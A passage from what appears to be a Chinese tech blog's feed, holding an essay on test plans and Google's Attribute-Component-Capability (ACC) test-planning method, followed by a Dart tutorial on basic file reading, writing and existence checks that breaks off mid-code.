&lt;p&gt;测试人员不应该对测试文档过于珍爱。软件开发过程充满了痛苦的挣扎：编码、评审、构建、测试、一轮接一轮的开发等，在这个过程里实在很难有时间坐下来欣赏一下测试计划。糟糕的测试用例不会受到足够的关注而被改善，它们只会被抛弃。则被留下来的是更好地测试用例。大家的关注点集中在不断增长的代码库，这才是最重要的东西，理应如此。&lt;/p&gt;
&lt;p&gt;作为一种测试文档，测试计划的生命周期是所有测试产物中最短的（显然，当客户明确要求编写测试计划，或者出于某些政府法规要求，就没这么灵活了。某些场合必须有测试计划并且保持更新）。在项目早期，人们需要一个测试计划。事实上，项目经理经常坚持必须有一个测试计划，并将编写测试计划作为一个比较重要的里程碑。但是，一旦计划就绪，这些人就把它扔到一边了，既不评审也不更新。测试计划就像是闹脾气的小孩儿手中可爱的毛绒玩具。我们希望它总是存在，到哪里都能带着它，但却从不真正关注它。只有它被拿走的时候，我们才会发出尖叫。&lt;/p&gt;
&lt;p&gt;测试计划是最早出现、最先被遗忘的测试产物。在项目早期，测试计划代表了对软件功能的预期。但是，除非得到持续的关注，它会很快随着新代码的完成、功能特性的改变以及设计的调整而过期。伴随着计划内或计划外的变更，维护一份测试计划是要花费大量精力的，除非多数项目的成员会定期查看，否则测试计划并没有什么价值。&lt;/p&gt;
&lt;p&gt;后面这一点才是测试计划真正的杀手：试问在产品的整个生命周期中，测试计划能在多大程度上作为测试活动的指导？测试人员会不断参考计划来安排一个应用的测试吗？会要求开发人员在功能增加或修改时去更新测试计划吗？在开发经理管理 to-do 列表的时候，他们会在桌面上打开一份测试计划吗？在进展沟通会议上，测试经理会经常参考测试计划的内容吗？如果测试计划真的重要，那么所有这些事情应该每天都会发生。理想情况下，测试计划应当在项目执行中发挥核心作用，应当在软件的整个生命周期中持续有效：随着代码库的更新而更新，时刻代表最新的产品功能，而不是停留在项目开始阶段时的样子。它应该可以帮助一个新加入的工程师迅速跟上项目进展。&lt;/p&gt;
&lt;p&gt;但是，这些不过都是理想情况而已。在Google或其他公司中，其实很少有测试人员能真正做到。下面是我们希望测试计划具有的一些特性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;及时地更新。&lt;/li&gt;
&lt;li&gt;描述了软件的目标和卖点。&lt;/li&gt;
&lt;li&gt;描述了软件的结构、各种组件和功能特性的名称。&lt;/li&gt;
&lt;li&gt;描述了软件的功能和操作简介。&lt;/li&gt;
&lt;li&gt;从纯粹测试的角度看，我们担心的是测试计划的投入和价值产出是否匹配。&lt;/li&gt;
&lt;li&gt;不必花过多的时间去撰写，必须随时可以被修改。&lt;/li&gt;
&lt;li&gt;应该描述必测点。&lt;/li&gt;
&lt;li&gt;应该能在测试中提供有用的信息，从而帮助确定进展以及覆盖率上的不足。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Google，测试计划的历史与我们所经历的其他公司基本相同。测试计划曾经是由各团队根据自身的实际情况自行定义和执行的。一些团队用文本文档和电子表格编写测试计划，与整个工程团队分享，但不放在中心数据库里；一些团队将测试计划放到产品主页的链接里；一些团队则放到项目的内部 Google Sites 页面里，或者作为工程设计文档或内部 wikis 的链接；少数团队甚至使用 Microsoft Word 文档，通过电子邮件传播；一些团队完全没有测试计划。我们只能认为测试用例的总数代表了整个测试计划。&lt;/p&gt;
&lt;p&gt;这些测试计划的评审链条是不透明的，很难确定作者和评审者。相当多的测试计划有一个时间和日期戳，非常清楚地表明了他们悠长的被遗忘的历史，就像冰箱角落里酱罐的保质期一样。它一定在某个时间对某个人发挥了重要的作用，但那个时间已经一去不返了。&lt;/p&gt;
&lt;h2 id=&#34;acc&#34;&gt;ACC&lt;/h2&gt;
&lt;p&gt;ACC（Attribute Component Capability，即特质、组件、能力。这是一种测试计划的替代方法），ACC的指导原则如下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;避免散漫的文字，推荐使用简明的列表。并不是所有的测试人员都想当小说家，也不具备将一个产品的目标或测试需求表达成散文的技能。而且，冗词赘句容易误读，只列出要点和事实就行了。&lt;/li&gt;
&lt;li&gt;不必推销。测试计划不是营销文案，既不是要讨论一个产品满足了多么重要的市场定位，也不是讨论这个产品有多么酷的功能。测试计划不是给客户或分析师看的，它的受众人群是工程师。&lt;/li&gt;
&lt;li&gt;简洁。测试计划并没有长度的要求。它不是中学的项目作业，长度无关紧要，不是越长越好。计划的大小与测试问题的规模有关，与作者的写作欲望无关。&lt;/li&gt;
&lt;li&gt;不要把不重要的、无法执行的东西放进测试计划。相关人员毫不关心的东西，就一个词也不要出现。&lt;/li&gt;
&lt;li&gt;渐进式的描述（Make it flow）。测试计划的每个部分应该是前面部分的延伸，以便读者可以随时停止阅读并且对产品的功能有一个初步的印象。如果读者希望了解更多的细节，那么他可以继续读下去。&lt;/li&gt;
&lt;li&gt;指导计划者的思路。一个好的计划过程能帮助计划者思考产品功能及其测试需求，从而有条不紊地从高层概念过渡到可以被直接实现的低层细节。&lt;/li&gt;
&lt;li&gt;最终结果应该是测试用例。在计划完成的时候，它不仅要清楚地描述要做什么样的测试，并且还可以清楚地指导测试用例的编写。做出一个不直接指导测试的计划纯粹是在浪费时间。&lt;/li&gt;
&lt;li&gt;最后一点非常重要：如果测试计划没有把测试用例应该怎么执行描述得足够详细，它就没有达到预先设定的帮助测试的本义。对测试的计划（the planning of tests）而言，它显然应该让我们清楚地知道需要编写哪些测试用例。当你正好处于&amp;quot;完全了解需要编写哪些测试&amp;quot;这一点时，才算完成了测试计划。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ACC通过指导计划者依次考察产品的三个维度达成这个目标：描述产品目标的形容词和副词；确定产品各部分、各特性的名词；描述产品实际做什么的动词。这样，我们通过测试完成的就是验证这些能力（capabilities）能正常运作、产品各组件（component）能满足应用的目标。&lt;/p&gt;
&lt;h3 id=&#34;a代表特质attribute&#34;&gt;A代表特质（Attribute）&lt;/h3&gt;
&lt;p&gt;在开始测试计划或做ACC分析的时候，必须先确定该产品对用户、对业务的意义。我们为什么要开发这个东西呢？它能带来什么核心价值？它又靠什么来吸引用户？记住，我们既不需要为这些问题做辩护，也不需要做什么解释，只要写下来就行了。我们可以假定产品经理和做产品计划的人，或者开发人员已经在这方面做了该做的事情。从测试的角度看，我们只需要确定并记下来，以备后续测试使用即可。&lt;/p&gt;
&lt;p&gt;我们通过一个称为特质、组件、能力分析的过程来记录这些核心价值。&lt;/p&gt;
&lt;p&gt;特质是系统的形容词，代表了产品的品质和特色，是区别于竞争对手的关键。在某种程度上，是人们选择你的产品而不是竞争对手的产品的原因。例如，Chrome的定位是快速、安全、稳定和优雅，这正是我们通过ACC记录的特质。之后，我们希望能够将测试用例关联到这些标签，这样，我们就会知道在验证Chrome的快速、安全等特质方面已经完成了多少测试。&lt;/p&gt;
&lt;p&gt;一般来说，产品经理会整理一个系统特质的列表，测试人员通过阅读产品需求文档、团队愿景和使命声明，甚至是听销售跟潜在的客户描绘这个系统来确定这个列表。说真的，我们发现在Google里，推销员和产品传道士是极佳的特质来源。想象一下箱体广告或你的产品将要如何在QVC（译注：QVC是全球最大的电视与网络的百货零售商，含义是Quality质量、Value价值、Convenience便利，通过电视与网络购物服务直达美国8,000万户以上的家庭）上做宣传，你就会找到列出这些特质的感觉了。&lt;/p&gt;
&lt;p&gt;下面是一些小窍门，可以帮助你在自己的项目里确定产品特质列表。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简单。如果1～2个小时还没有完成，那和你在这一步花的时间太多了。&lt;/li&gt;
&lt;li&gt;精确。确保它来自于团队已经普遍认同的文档或营销信息。&lt;/li&gt;
&lt;li&gt;变化。不必担心您是否漏掉了什么&amp;ndash;如果后来发现这个特质不明显，极有可能它也不怎么重要。&lt;/li&gt;
&lt;li&gt;短小。数量方面，一打（十二个）是一个不错的目标。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用特质的目的，是确定哪些特性是产品存在的根本原因，并使这些原因为测试人员所周知。这样，他们就会意识到自己所做的测试是如何对产品存在的根本原因产生影响的。拿Google Sites这个产品来举个例子。这是一个免费的应用，供开放或封闭的社区建立自己的共享网站。Sites类似许多终端应用，在它的文档里描述了大多数的特质。实际上，大多数应用程序具有类似的开始页面或销售材料，这经常可以帮你确定特质列表。如果没有，那就找一个销售聊一聊，或者采用更好的方式（如参加一个销售电话或演示），就可以得到所需信息了。特质就在那里等着你。如果你不能在几分钟内列举出来，说明你还没有足够的理解你的产品，还不能有效地测试它。一旦熟悉了你的产品，罗列特质不过是几分钟的事情。&lt;/p&gt;
&lt;h3 id=&#34;c代表组件component&#34;&gt;C代表组件（component）&lt;/h3&gt;
&lt;p&gt;组件是系统的名词，在特质被识别之后确定。组件是构成待建系统的模块，例如在线商店的购物车和结账系统，word处理器的格式化和打印功能等。组件是使一个软件之所以如此的关键代码块。实际上，他们正是测试人员要测试的对象。&lt;/p&gt;
&lt;p&gt;一般来说，组件容易识别，经常出现在设计文档里。对大型系统来说，它们是架构图里的大框架，经常出现在bug库中的标签里，或者在项目主页和文档中被高亮出来。对小型项目来说，它们是代码里的类和对象。无论何时，只要问一下开发人员&amp;quot;你们在编写什么组件&amp;quot;，你就可以毫不费力地得到一个列表。&lt;/p&gt;
&lt;p&gt;与特质一样，在识别组件时，到达何种级别的细致程度是至关重要的。太多的细节除了把人搞晕之外不会再有什么好处，而太少的细节也会导致无物可测。确保一个短小的列表：10看起来不错，20就太多了，当然除非系统非常大。把一些次要的东西排除在外，是可以的。既然是次要的，那它们或是另外一个组件的一部分，又或者对于最终用户而言都无关紧要，不值得在上面花精力。&lt;/p&gt;
&lt;p&gt;事实上，对于特质和组件来说，用几分钟的时间来理清它们就足够了。如果你费了很大劲来确定这些组件，那说明你对产品缺乏了解，你应该花一些时间来使用它直到成为高级用户。任何高级用户都应该能够立即罗列出特质列表，任何对源代码和文档有访问权限的项目内部人员也应该能够迅速地列出它的组件。毫无疑问，我们认为很重要的一点是，测试人员既是高级用户，也是项目内部人员。&lt;/p&gt;
&lt;p&gt;最后，不必担心完整性问题。整个ACC过程的要点是快速行动，动态迭代。漏掉的特质可以在罗列组件时被发现。当你开始做&amp;quot;能力&amp;quot;部分的时候，你也会找到那些先前遗漏的特质或组件。&lt;/p&gt;
&lt;h3 id=&#34;c代表能力capability&#34;&gt;C代表能力（capability）&lt;/h3&gt;
&lt;p&gt;能力是系统的动词，代表着系统在用户指令之下完成的动作。它们是对输入的响应、对查询的应答，以及代表用户完成的活动。事实上，这正是用户选择一个软件的原因所在：他们需要一些功能而你的软件提供了这些功能。&lt;/p&gt;
&lt;p&gt;例如，Chrome具有渲染Web页面和播放Flash文件的能力，可以同步多个客户端，下载文档。所有这些都是能力，再加上许多其他的功能，构成了Chrome web浏览器的完整能力集合。另一方面，一个购物应用具有商品搜索和完成一笔交易的能力。当一个应用能够完成一个任务的时候，这个任务就被标记为它的一项能力。&lt;/p&gt;
&lt;p&gt;能力处于特质和组件的交点。组件（component）执行某种功能（function）来满足产品的一个特质（attribute），这个活动的结果是向用户提供某种能力（capability）。Chrome飞快地渲染一个页面。Chrome安全地播放一个Flash文件。如果你的产品所做的一件事情不属于任何特质和组件的交点，这件事大概也是无关紧要的，而且还会让人产生疑问：为什么要实现这样的功能呢？如果一个功能不能为产品带来核心价值，就像是可以被去掉的肥肉一样，那么这个功能也就无甚益处，反而可能会带来不少毛病。事实或者如此，或者是有合理的解释但你却不知道。&amp;ldquo;不懂产品&amp;quot;是测试这个职业所不可接受的。任何工程师，如果理解了产品的用户价值，他就可以成为一名测试人员。&lt;/p&gt;
&lt;p&gt;这里是一个例子，展示了一个在线商店具有的能力。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从购物车里增加或删除物品。这是Cart（购物车）组件在满足直观的UI（Intuitive UI）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;获得信用卡和验证数据。这是Cart组件在满足便利（convenient）特质和集成（Integrated）特质（如与支付系统集成）时的一个能力。&lt;/li&gt;
&lt;li&gt;使用HTTPS处理钱款交易。这是Cart组件在满足安全（secure）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;基于购物者正在浏览的商品提供建议。这是Search组件在满足便利（convenient）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;计算送货成本。这是UPS集成组件在满足快速（fast）和安全（secure）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;显示剩余库存。这是Search组件在满足便利（convenient）和精准（accurate）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;推迟购买。这是Cart组件在满足便利（convenient）特质时的一个能力。&lt;/li&gt;
&lt;li&gt;根据关键字、SKU和类目搜索商品。这是Search组件在满足便利（convenient）和精准（accurate）特质时的一个能力。一般情况下，我们倾向于把每一种搜索当作一个单独的能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;显然你会发现大量的能力。当你感到正在列出所有可测之处的时候，说明你已经掌握了ACC的精髓，那就是快速简明的列出保证待验证系统能正常运转的那些最重要的能力。能力一般是面向用户的，表达的是用户眼里系统的行为，往往比特质和组件都要多很多。ACC的前两步遵循简洁法则，而能力则应当描述系统的完整功能，因此基于应用的功能丰富性和复杂性，能力在数量上可以很大。&lt;/p&gt;
&lt;p&gt;就我们在Google 涉及的系统而言，大型复杂应用拥有成百上千个能力（例如，Chrome OS有300多项能力），而较小的应用则有数十个能力。当然，只有几个能力的产品也是有的，往往只需要开发人员自己或少数早期用户做一些测试就行了。因此，当所测产品的能力少于20个时，可能需要反思一下自己在这个项目中的意义。&lt;/p&gt;
&lt;p&gt;能力最重要的一个特点是它的可测试性。这是我们用主动语态来表达能力的主要原因。它们是动词，因为我们为了完成某个动作，我们不得不编写测试用例去验证这个能力得到了正确的实现，而用户将因为这个特性而喜欢这个产品。后面我们将讨论如何把能力转换成测试用例。&lt;/p&gt;
&lt;p&gt;在罗列能力时，应该达到什么样的抽象级别呢？这在Google TE中存在很大的争议。依其定义，能力不是原子动作。一个能力可以描述任意数量的用例。在之前描述在线商店的例子中，能力描述并没有限定购物车中的商品或一个搜索的结果，而只是表达了用户可能会做的事情。这是有意的，因为太多的细节会导致长篇大论。穷尽所有可能的搜索和购物车配置来完成测试是不可能的。因此，我们在把能力转换成测试用例的时候，只会重点考察那些实际使用的测试场景。&lt;/p&gt;
&lt;p&gt;能力描述并不是测试用例，不会包含实际测试所需要的一切信息，例如特定的值和具体的数据。能力只要说明用户可以购物，而测试用例则要指定他们买什么东西。能力是软件可以提供或者用户可能要求的动作的一般性概念，是抽象的，测试和价值隐含其中，但它们不是测试本身。&lt;/p&gt;
&lt;p&gt;还是以Google Sites为例，给出一个以特质为x轴，组件为y轴的表格。通过这种方法，能力被映射到特质和组件。首先，注意大量的单元格是空的。这很正常，因为不是每个组件对每个特质都有影响。对Chrome来说，只有一部分组件对快速或安全性负责；而其他组件对这些特质却没有影响，对应的单元格就为空。空单元格表示我们不必测试这个特定的特质组件对。&lt;/p&gt;
&lt;p&gt;能力表的每一行或列表示按某种方式相关联的一个功能切片，是将应用功能分解为多个可测试的活动的一个好办法。测试经理可以把每一行分给一个测试小组，或者针对一行或一列进行深度的bug大扫除。行或列也是探索式测试的极好目标，每个探索式测试人员负责不同的行和列，就可以有效避免重叠，并达到更高的覆盖度。&lt;/p&gt;
&lt;p&gt;单元格中的数字表示该组件满足此特质的能力的数量。因此，这个数越大，该交叉点需要的测试点就越多。例如，Page View组件有3个能力影响到Sharing这个特质。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协作者都有权限访问相关文档。&lt;/li&gt;
&lt;li&gt;与另外一个协作者分担页面管理责任。&lt;/li&gt;
&lt;li&gt;查看一个页面中协作者的位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些能力点可以很方便地指定Page View / Sharing这个组件/特质对需要的测试。我们可以直接为这些能力点编写测试用例，或者将它们组合成更大的用例或测试场景来测试能力的组合。书写良好的能力需要一些训练。下面是一些能力应该满足的特性以供参考。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（1）一个能力点应当被表达为一个动作，反映了用户使用被测应用完成一定的活动。&lt;/li&gt;
&lt;li&gt;（2）一个能力点应当为测试人员提供足够的指导，用以理解在编写测试用例时涉及到的变量。例如，使用https处理钱款交易这个能力，需要测试人员理解系统支持何种类型的钱款交易、如何验证交易是通过https进行的。显然，这里有很多工作要做。如果某些钱款交易有被遗漏的可能（如被某个测试新人），那么就一定要把这个能力复制多份，以便能明确的展示各种交易类型。如果不会发生遗漏，原来的抽象程度就足够了。同样的，如果https是大家都理解的东西，那这个词无需额外解释。千万不要掉进把一切东西都当作能力记录下来的陷阱。能力应当是抽象的，把更多的细节留给测试用例或者探索式测试吧（将这些细节留给测试人员，为从不同角度理解能力和编写测试用例留下了自由发挥的空间，这有助于提高测试的覆盖度）。&lt;/li&gt;
&lt;li&gt;（3）一个能力应当与其他能力组合。实际上，一个用户故事或用例（或你选择的其他术语）可以用一系列能力来描述。如果一个用户故事无法用现有的能力来表达，那说明你遗漏了一些能力，或者能力描述的抽象程度太高了。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用一系列能力来描述用户故事，这个中间步骤可以为测试带来更大的灵活性。事实上，在Google有几个团队，在与外包接洽或者组织众包型的探索式测试时，更愿意使用比较一般性的用户故事，而不是太细节的测试用例。很细致的测试用例反而会导致外包人员在一遍又一遍的重复执行时产生厌倦感，而用户故事则为确定具体行为留出了更大的余地，从而使得测试更加有趣，较少因为枯燥、死板地执行导致产生错误。不管最终目标是用户故事、测试用例还是两者兼有，这里是一些从能力到测试用例的一般性指南。记住这些只是目标，而非绝对标准。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个能力都应该链接到至少一个测试用例。如果能力有足够的重要性被记录下来，也应该有足够的重要性被测试。&lt;/li&gt;
&lt;li&gt;很多能力需要多个测试用例。每当输入、输入顺序、系统变量、使用的数据等存在变化的时候，就需要编写多个测试用例。How to break software一书中提及的攻击，Exploratory Software Testing一书中提及的漫游，都可用来指导测试用例的选择或思考哪些数据和输入最有可能发现一个bug。&lt;/li&gt;
&lt;li&gt;并非所有的能力都是同等重要的。流程的下一步（在下一节中描述）讨论通过关联风险来区分能力的重要性这一问题。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Dart—文件操作</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
        <pubDate>Mon, 26 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
        <description>&lt;h2 id=&#34;1写文件&#34;&gt;1.写文件&lt;/h2&gt;
&lt;p&gt;无需手动关闭文件，文件写入完成后自动关闭&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:io&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;{
  &lt;span style=&#34;color:#75715e&#34;&gt;// 创建文件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;The easiest way to write text to a file is to create a File&amp;#39;&lt;/span&gt;;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 向文件写入字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.writeAsString(content);
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Data written.&amp;#39;&lt;/span&gt;);
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (e) {
    print(e);
  }
}

Future&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;File&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; writeAsString(
    &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; contents,
    {
        FileMode mode: FileMode.write,
        Encoding encoding: utf8,
        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; flush: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
    }
)
&lt;span style=&#34;color:#75715e&#34;&gt;// FileMode: read, write, append, writeOnly, writeOnlyAppend
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要手动关闭文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:io&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;{
  &lt;span style=&#34;color:#75715e&#34;&gt;// 创建文件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#75715e&#34;&gt;// 文件模式设置为追加
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  IOSink isk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; file.openWrite(mode: FileMode.append);

  &lt;span style=&#34;color:#75715e&#34;&gt;// 多次写入
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  isk.write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A woman is like a tea bag&amp;#39;&lt;/span&gt;);
  isk.writeln(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;you never know how strong it is until it&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s in hot water.&amp;#39;&lt;/span&gt;);
  isk.writeln(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-Eleanor Roosevelt&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; isk.close();
  print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Done!&amp;#39;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2读文件&#34;&gt;2.读文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;{
  File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.readAsString();
    print(content);
  }&lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;(e){
    print(e);
  }
}
&lt;span style=&#34;color:#75715e&#34;&gt;/*————————————————*/&lt;/span&gt;
readAsBytes
readAsBytesSync
readAsString
readAsStringSync
readAsLines
readAsLinesSync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3文件存在判断&#34;&gt;3.文件存在判断&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:io&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;{
  File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;);

  &lt;span style=&#34;color:#75715e&#34;&gt;// 判断文件是否存在
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.exists()){
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;文件存在&amp;#34;&lt;/span&gt;);
  }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;文件不存在&amp;#34;&lt;/span&gt;);
  }

  &lt;span style=&#34;color:#75715e&#34;&gt;// 复制文件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.copy(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test-1.txt&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#75715e&#34;&gt;// 修改文件名。当传入不同路径时，可用来移动文件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.rename(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test-2.txt&amp;#34;&lt;/span&gt;);
  
  &lt;span style=&#34;color:#75715e&#34;&gt;// 获取文件 size
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  print(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; file.length());
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4目录存在判断&#34;&gt;4.目录存在判断&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:io&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;;

  &lt;span style=&#34;color:#75715e&#34;&gt;// 判断路径是否是文件夹
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; FileSystemEntity.isDirectory(path)) {
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;path&lt;span style=&#34;color:#e6db74&#34;&gt; is not a directory&amp;#39;&lt;/span&gt;);
  } 

